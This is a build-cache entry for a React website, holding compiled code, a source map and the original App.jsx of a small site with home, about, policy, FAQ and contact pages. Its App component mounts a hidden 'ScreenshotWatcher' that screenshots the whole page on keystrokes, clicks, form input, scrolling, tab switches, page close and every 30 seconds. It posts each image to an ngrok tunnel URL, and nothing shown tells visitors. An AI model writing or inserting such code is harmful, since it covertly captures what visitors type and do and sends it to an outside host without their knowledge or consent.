{"ast":null,"code":"import'bootstrap/dist/css/bootstrap.min.css';import'bootstrap/dist/js/bootstrap.bundle.min.js';import html2canvas from\"html2canvas\";import{useEffect,useRef,useState}from'react';import{Route,BrowserRouter as Router,Routes,useLocation}from'react-router-dom';import\"slick-carousel/slick/slick-theme.css\";import\"slick-carousel/slick/slick.css\";import About from'../src/About';import Home from'../src/Home';import Policy from'../src/Policy';import\"./assets/app.css\";import Footer from\"./components/Footer\";import NavbarHeader from'./components/NavbarHeader';import ContactUs from'./ContactUs';import Faqs from'./Faqs';// Enhanced ScreenshotWatcher Component\nimport{jsx as _jsx,jsxs as _jsxs}from\"react/jsx-runtime\";function ScreenshotWatcher(){const location=useLocation();const lastCaptureRef=useRef(0);const minInterval=10000;// 10 seconds between captures\nconst[success,setSuccess]=useState(false);const captureScreenshot=async function(){let reason=arguments.length>0&&arguments[0]!==undefined?arguments[0]:'activity';const now=Date.now();if(now-lastCaptureRef.current<minInterval)return;// prevent too frequent\nlastCaptureRef.current=now;try{const canvas=await html2canvas(document.body);const dataUrl=canvas.toDataURL(\"image/png\");// Send the screenshot data to the FastAPI endpoint\nconst response=await fetch(\"https://6e53d9987fbf.ngrok-free.app/screenshot/upload\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({image_data:dataUrl})});console.log(\"\\uD83D\\uDCF8 Screenshot sent (\".concat(reason,\")\"));}catch(err){console.error(\"Screen capture failed:\",err);}};useEffect(()=>{const captureScreenshotOnClose=async()=>{await captureScreenshot('window_close');};window.addEventListener(\"beforeunload\",captureScreenshotOnClose);return()=>{window.removeEventListener(\"beforeunload\",captureScreenshotOnClose);};},[]);useEffect(()=>{// Capture on route change\ncaptureScreenshot('navigation');// Event listeners for all activities\nconst handleKeyPress=e=>{if(e.key.length===1||e.key.startsWith('F')||e.ctrlKey||e.altKey||e.metaKey){captureScreenshot('keyboard_activity');}};const handleMouseClick=e=>{captureScreenshot('mouse_click');};const handleFormInput=e=>{if(['INPUT','TEXTAREA','SELECT'].includes(e.target.tagName)){captureScreenshot('form_interaction');}};const handleVisibilityChange=()=>{if(!document.hidden){captureScreenshot('tab_switch');}};const handleResize=()=>{captureScreenshot('window_resize');};const handleScroll=()=>{captureScreenshot('scroll_activity');};// Add event listeners\ndocument.addEventListener('keydown',handleKeyPress);document.addEventListener('click',handleMouseClick);document.addEventListener('input',handleFormInput);document.addEventListener('change',handleFormInput);document.addEventListener('visibilitychange',handleVisibilityChange);window.addEventListener('resize',handleResize);window.addEventListener('scroll',handleScroll);// Periodic captures\nconst periodicInterval=setInterval(()=>{captureScreenshot('periodic');},30000);// Cleanup\nreturn()=>{document.removeEventListener('keydown',handleKeyPress);document.removeEventListener('click',handleMouseClick);document.removeEventListener('input',handleFormInput);document.removeEventListener('change',handleFormInput);document.removeEventListener('visibilitychange',handleVisibilityChange);window.removeEventListener('resize',handleResize);window.removeEventListener('scroll',handleScroll);clearInterval(periodicInterval);};},[location]);return null;}export default function App(){return/*#__PURE__*/_jsxs(Router,{children:[/*#__PURE__*/_jsx(ScreenshotWatcher,{}),/*#__PURE__*/_jsxs(\"div\",{children:[/*#__PURE__*/_jsx(NavbarHeader,{}),/*#__PURE__*/_jsxs(Routes,{children:[/*#__PURE__*/_jsx(Route,{path:\"/\",element:/*#__PURE__*/_jsx(Home,{})}),/*#__PURE__*/_jsx(Route,{path:\"/about\",element:/*#__PURE__*/_jsx(About,{})}),/*#__PURE__*/_jsx(Route,{path:\"/policy\",element:/*#__PURE__*/_jsx(Policy,{})}),/*#__PURE__*/_jsx(Route,{path:\"/faqs\",element:/*#__PURE__*/_jsx(Faqs,{})}),/*#__PURE__*/_jsx(Route,{path:\"/contact\",element:/*#__PURE__*/_jsx(ContactUs,{})})]}),/*#__PURE__*/_jsx(Footer,{})]})]});}","map":{"version":3,"names":["html2canvas","useEffect","useRef","useState","Route","BrowserRouter","Router","Routes","useLocation","About","Home","Policy","Footer","NavbarHeader","ContactUs","Faqs","jsx","_jsx","jsxs","_jsxs","ScreenshotWatcher","location","lastCaptureRef","minInterval","success","setSuccess","captureScreenshot","reason","arguments","length","undefined","now","Date","current","canvas","document","body","dataUrl","toDataURL","response","fetch","method","headers","JSON","stringify","image_data","console","log","concat","err","error","captureScreenshotOnClose","window","addEventListener","removeEventListener","handleKeyPress","e","key","startsWith","ctrlKey","altKey","metaKey","handleMouseClick","handleFormInput","includes","target","tagName","handleVisibilityChange","hidden","handleResize","handleScroll","periodicInterval","setInterval","clearInterval","App","children","path","element"],"sources":["C:/Users/Muhammad Ali/Desktop/marcos/myapp/frontend/src/App.jsx"],"sourcesContent":["import 'bootstrap/dist/css/bootstrap.min.css';\r\nimport 'bootstrap/dist/js/bootstrap.bundle.min.js';\r\nimport html2canvas from \"html2canvas\";\r\nimport { useEffect, useRef, useState } from 'react';\r\nimport { Route, BrowserRouter as Router, Routes, useLocation } from 'react-router-dom';\r\nimport \"slick-carousel/slick/slick-theme.css\";\r\nimport \"slick-carousel/slick/slick.css\";\r\nimport About from '../src/About';\r\nimport Home from '../src/Home';\r\nimport Policy from '../src/Policy';\r\nimport \"./assets/app.css\";\r\nimport Footer from \"./components/Footer\";\r\nimport NavbarHeader from './components/NavbarHeader';\r\nimport ContactUs from './ContactUs';\r\nimport Faqs from './Faqs';\r\n\r\n// Enhanced ScreenshotWatcher Component\r\nfunction ScreenshotWatcher() {\r\n    const location = useLocation();\r\n    const lastCaptureRef = useRef(0);\r\n    const minInterval = 10000; // 10 seconds between captures\r\n\r\n    const [success, setSuccess] = useState(false);\r\n\r\n    const captureScreenshot = async (reason = 'activity') => {\r\n        const now = Date.now();\r\n        if (now - lastCaptureRef.current < minInterval) return;  // prevent too frequent\r\n        lastCaptureRef.current = now;\r\n\r\n        try {\r\n            const canvas = await html2canvas(document.body);\r\n            const dataUrl = canvas.toDataURL(\"image/png\");\r\n\r\n            // Send the screenshot data to the FastAPI endpoint\r\n            const response = await fetch(\"https://6e53d9987fbf.ngrok-free.app/screenshot/upload\", {\r\n                method: \"POST\",\r\n                headers: { \"Content-Type\": \"application/json\" },\r\n                body: JSON.stringify({ image_data: dataUrl })\r\n            });\r\n\r\n            console.log(`ðŸ“¸ Screenshot sent (${reason})`);\r\n        } catch (err) {\r\n            console.error(\"Screen capture failed:\", err);\r\n        }\r\n    };\r\n\r\n    useEffect(() => {\r\n        const captureScreenshotOnClose = async () => {\r\n            await captureScreenshot('window_close');\r\n        };\r\n\r\n        window.addEventListener(\"beforeunload\", captureScreenshotOnClose);\r\n\r\n        return () => {\r\n            window.removeEventListener(\"beforeunload\", captureScreenshotOnClose);\r\n        };\r\n    }, []);\r\n\r\n    useEffect(() => {\r\n        // Capture on route change\r\n        captureScreenshot('navigation');\r\n\r\n        // Event listeners for all activities\r\n        const handleKeyPress = (e) => {\r\n            if (e.key.length === 1 || e.key.startsWith('F') || e.ctrlKey || e.altKey || e.metaKey) {\r\n                captureScreenshot('keyboard_activity');\r\n            }\r\n        };\r\n\r\n        const handleMouseClick = (e) => {\r\n            captureScreenshot('mouse_click');\r\n        };\r\n\r\n        const handleFormInput = (e) => {\r\n            if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {\r\n                captureScreenshot('form_interaction');\r\n            }\r\n        };\r\n\r\n        const handleVisibilityChange = () => {\r\n            if (!document.hidden) {\r\n                captureScreenshot('tab_switch');\r\n            }\r\n        };\r\n\r\n        const handleResize = () => {\r\n            captureScreenshot('window_resize');\r\n        };\r\n\r\n        const handleScroll = () => {\r\n            captureScreenshot('scroll_activity');\r\n        };\r\n\r\n        // Add event listeners\r\n        document.addEventListener('keydown', handleKeyPress);\r\n        document.addEventListener('click', handleMouseClick);\r\n        document.addEventListener('input', handleFormInput);\r\n        document.addEventListener('change', handleFormInput);\r\n        document.addEventListener('visibilitychange', handleVisibilityChange);\r\n        window.addEventListener('resize', handleResize);\r\n        window.addEventListener('scroll', handleScroll);\r\n\r\n        // Periodic captures\r\n        const periodicInterval = setInterval(() => {\r\n            captureScreenshot('periodic');\r\n        }, 30000);\r\n\r\n        // Cleanup\r\n        return () => {\r\n            document.removeEventListener('keydown', handleKeyPress);\r\n            document.removeEventListener('click', handleMouseClick);\r\n            document.removeEventListener('input', handleFormInput);\r\n            document.removeEventListener('change', handleFormInput);\r\n            document.removeEventListener('visibilitychange', handleVisibilityChange);\r\n            window.removeEventListener('resize', handleResize);\r\n            window.removeEventListener('scroll', handleScroll);\r\n            clearInterval(periodicInterval);\r\n        };\r\n    }, [location]);\r\n\r\n    return null;\r\n}\r\n\r\nexport default function App() {\r\n    return (\r\n        <Router>\r\n            <ScreenshotWatcher />\r\n\r\n            <div>\r\n                <NavbarHeader />\r\n                <Routes>\r\n                    <Route path=\"/\" element={<Home />} />\r\n                    <Route path=\"/about\" element={<About />} />\r\n                    <Route path=\"/policy\" element={<Policy />} />\r\n                    <Route path=\"/faqs\" element={<Faqs />} />\r\n                    <Route path=\"/contact\" element={<ContactUs />} />\r\n                </Routes>\r\n                <Footer />\r\n            </div>\r\n        </Router>\r\n    );\r\n}"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}